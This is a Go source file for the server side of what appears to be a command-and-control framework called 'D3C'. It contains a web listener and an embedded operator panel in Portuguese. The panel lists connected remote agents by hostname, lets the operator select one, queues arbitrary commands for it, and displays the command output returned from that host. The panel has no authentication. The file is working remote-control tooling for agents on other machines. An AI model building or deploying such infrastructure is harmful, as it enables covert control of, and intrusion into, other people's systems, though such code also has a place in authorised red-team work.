package listeners

import (
	"d3c/commons/estruturas"
	. "d3c/server/helpers"
	"encoding/json"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"
)

var webMu sync.RWMutex

type agentDTO struct {
	ID       string    `json:"id"`
	Name     string    `json:"name"`
	Hostname string    `json:"hostname"`
	LastSeen time.Time `json:"lastSeen"`
	Dead     bool      `json:"dead"`
}

func StartWebListener(port string, agentesEmCampo *[]estruturas.Mensagem, agenteSelecionado *string) {
	mux := http.NewServeMux()

	mux.HandleFunc("/api/agents", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		webMu.RLock()
		agents := make([]agentDTO, len(*agentesEmCampo))
		for i, a := range *agentesEmCampo {
			agents[i] = agentDTO{
				ID:       a.AgentID,
				Name:     a.AgentName,
				Hostname: a.AgentHostname,
				LastSeen: a.LastSeen,
				Dead:     a.AgenteDead,
			}
		}
		webMu.RUnlock()
		json.NewEncoder(w).Encode(agents)
	})

	mux.HandleFunc("/api/select", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			w.WriteHeader(http.StatusMethodNotAllowed)
			return
		}
		var body struct{ AgentID string }
		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
			w.WriteHeader(http.StatusBadRequest)
			return
		}
		webMu.Lock()
		*agenteSelecionado = body.AgentID
		webMu.Unlock()
		w.WriteHeader(http.StatusOK)
	})

	mux.HandleFunc("/api/command", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			w.WriteHeader(http.StatusMethodNotAllowed)
			return
		}
		var body struct{ Command string }
		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
			w.WriteHeader(http.StatusBadRequest)
			return
		}
		cmd := strings.TrimSpace(body.Command)
		if cmd == "" {
			w.WriteHeader(http.StatusBadRequest)
			return
		}
		webMu.Lock()
		sel := *agenteSelecionado
		if sel != "" {
			pos := PosicaoAgenteEmCampo(sel, *agentesEmCampo)
			(*agentesEmCampo)[pos].Comandos = append(
				(*agentesEmCampo)[pos].Comandos,
				estruturas.Commando{Comando: cmd},
			)
		}
		webMu.Unlock()
		w.WriteHeader(http.StatusOK)
	})

	mux.HandleFunc("/api/log", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		afterIndex, _ := strconv.Atoi(r.URL.Query().Get("after"))
		json.NewEncoder(w).Encode(GetLogSince(afterIndex))
	})

	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Write([]byte(webUI))
	})

	http.ListenAndServe(":"+port, mux)
}

const webUI = `<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>D3C Panel</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Courier New',monospace;background:#0d0d0d;color:#d4d4d4;height:100vh;display:flex;flex-direction:column;overflow:hidden}
header{display:flex;align-items:center;gap:12px;padding:8px 16px;background:#141414;border-bottom:1px solid #1e1e1e;flex-shrink:0}
header h1{font-size:.9rem;letter-spacing:4px;color:#00ff41}
#status{font-size:.72rem;color:#555;margin-left:auto}
.container{display:flex;flex:1;overflow:hidden}
.sidebar{width:230px;min-width:180px;background:#111;border-right:1px solid #1c1c1c;display:flex;flex-direction:column;flex-shrink:0}
.sidebar h2{padding:8px 12px;font-size:.65rem;letter-spacing:3px;color:#444;border-bottom:1px solid #1c1c1c;flex-shrink:0}
#agents-list{flex:1;overflow-y:auto}
#agents-list::-webkit-scrollbar{width:3px}
#agents-list::-webkit-scrollbar-thumb{background:#222}
.no-agents{padding:16px 12px;color:#2e2e2e;font-size:.75rem}
.agent-card{padding:9px 12px;cursor:pointer;border-bottom:1px solid #181818;transition:background .1s}
.agent-card:hover{background:#181818}
.agent-card.selected{background:#091709;border-left:2px solid #00ff41}
.agent-card.dead .aname{color:#3a3a3a}
.agent-row{display:flex;align-items:center;gap:6px}
.dot{width:6px;height:6px;border-radius:50%;flex-shrink:0}
.dot.alive{background:#00ff41;box-shadow:0 0 5px #00ff41}
.dot.dead{background:#2e2e2e}
.aname{font-size:.8rem;font-weight:bold;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:#ccc}
.asub{font-size:.62rem;color:#333;margin-top:3px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.terminal{flex:1;display:flex;flex-direction:column;overflow:hidden}
#output{flex:1;overflow-y:auto;padding:10px 14px;font-size:.8rem;line-height:1.75}
#output::-webkit-scrollbar{width:3px}
#output::-webkit-scrollbar-thumb{background:#1e1e1e}
.empty{display:flex;height:100%;align-items:center;justify-content:center;color:#252525;font-size:.8rem}
.le{margin-bottom:2px}
.le-ts{color:#333}
.le-host{color:#00cc33}
.le-gt{color:#444}
.le-cmd{color:#7ec87e}
.le-resp{white-space:pre-wrap;color:#999;padding-left:2px;display:block}
.le-sent{color:#383838;font-style:italic}
.input-bar{display:flex;align-items:center;padding:8px 14px;background:#111;border-top:1px solid #1c1c1c;gap:8px;flex-shrink:0}
#prompt{color:#00ff41;font-size:.82rem;white-space:nowrap;flex-shrink:0}
#cmd{flex:1;background:transparent;border:none;outline:none;color:#00ff41;font-family:'Courier New',monospace;font-size:.82rem;caret-color:#00ff41}
#cmd::placeholder{color:#252525}
.btn{background:transparent;border:1px solid #252525;color:#444;font-family:monospace;font-size:.72rem;padding:4px 12px;cursor:pointer;letter-spacing:1px;transition:all .1s}
.btn:hover{border-color:#00ff41;color:#00ff41}
</style>
</head>
<body>
<header>
  <h1>&#9658; D3C</h1>
  <span id="status">aguardando...</span>
</header>
<div class="container">
  <div class="sidebar">
    <h2>AGENTES</h2>
    <div id="agents-list"><div class="no-agents">Nenhum agente conectado.</div></div>
  </div>
  <div class="terminal">
    <div id="output"><div class="empty">&#8592; Selecione um agente para iniciar</div></div>
    <div class="input-bar">
      <span id="prompt">D3C&gt;&nbsp;</span>
      <input id="cmd" type="text" placeholder="comando..." autocomplete="off" spellcheck="false">
      <button class="btn" onclick="sendCmd()">[ ENTER ]</button>
    </div>
  </div>
</div>
<script>
var sel=null,selHost='',logAfter=0,cmdHistory=[],histIdx=-1;

async function fetchAgents(){
  try{
    var r=await fetch('/api/agents'),agents=await r.json()||[];
    renderAgents(agents);
    var alive=agents.filter(function(a){return !a.dead}).length;
    document.getElementById('status').textContent=
      agents.length===0?'aguardando agentes...':
      agents.length+' agente(s) · '+alive+' ativo(s)';
  }catch(e){}
}

function renderAgents(agents){
  var el=document.getElementById('agents-list');
  if(!agents.length){el.innerHTML='<div class="no-agents">Nenhum agente conectado.</div>';return}
  el.innerHTML=agents.map(function(a){
    var id=a.name||a.id,host=a.hostname||id;
    var isSel=(sel===id||sel===a.id||sel===a.name);
    var ts=a.lastSeen?new Date(a.lastSeen).toLocaleTimeString('pt-BR'):'--';
    return '<div class="agent-card'+(isSel?' selected':'')+(a.dead?' dead':'')+'" onclick="selectAgent(\''+esc(id)+'\',\''+esc(host)+'\')">'+
      '<div class="agent-row"><div class="dot '+(a.dead?'dead':'alive')+'"></div><span class="aname">'+h(host)+'</span></div>'+
      '<div class="asub">'+h(a.id.substring(0,14))+'... &middot; '+ts+'</div>'+
      '</div>';
  }).join('');
}

async function selectAgent(id,host){
  sel=id;selHost=host;
  await fetch('/api/select',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({AgentID:id})});
  document.getElementById('prompt').textContent=host+'@D3C# ';
  document.getElementById('cmd').focus();
  fetchAgents();
}

async function sendCmd(){
  var inp=document.getElementById('cmd'),cmd=inp.value.trim();
  if(!cmd||!sel)return;
  inp.value='';
  cmdHistory.unshift(cmd);histIdx=-1;
  addLine('<span class="le-sent">&rarr; '+h(cmd)+'</span>');
  try{
    await fetch('/api/command',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({Command:cmd})});
  }catch(e){}
}

async function fetchLog(){
  try{
    var r=await fetch('/api/log?after='+logAfter),entries=await r.json()||[];
    entries.forEach(function(e){
      logAfter=Math.max(logAfter,e.index);
      var ts=new Date(e.timestamp).toLocaleTimeString('pt-BR');
      var resp=e.response?'\n<span class="le-resp">'+h(e.response)+'</span>':'';
      addLine(
        '<span class="le-ts">['+ts+']</span> '+
        '<span class="le-host">'+h(e.hostname)+'</span>'+
        '<span class="le-gt"> &gt; </span>'+
        '<span class="le-cmd">'+h(e.command)+'</span>'+resp
      );
    });
  }catch(e){}
}

function addLine(html){
  var out=document.getElementById('output'),em=out.querySelector('.empty');
  if(em)em.remove();
  var d=document.createElement('div');d.className='le';d.innerHTML=html;
  out.appendChild(d);out.scrollTop=out.scrollHeight;
}

function h(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
function esc(s){return String(s).replace(/\\/g,'\\\\').replace(/'/g,'\\x27')}

document.getElementById('cmd').addEventListener('keydown',function(e){
  if(e.key==='Enter'){sendCmd()}
  else if(e.key==='ArrowUp'){e.preventDefault();if(histIdx<cmdHistory.length-1){histIdx++;this.value=cmdHistory[histIdx]||''}}
  else if(e.key==='ArrowDown'){e.preventDefault();if(histIdx>0){histIdx--;this.value=cmdHistory[histIdx]||''}else{histIdx=-1;this.value=''}}
});

fetchAgents();fetchLog();
setInterval(fetchAgents,3000);
setInterval(fetchLog,2000);
</script>
</body>
</html>`
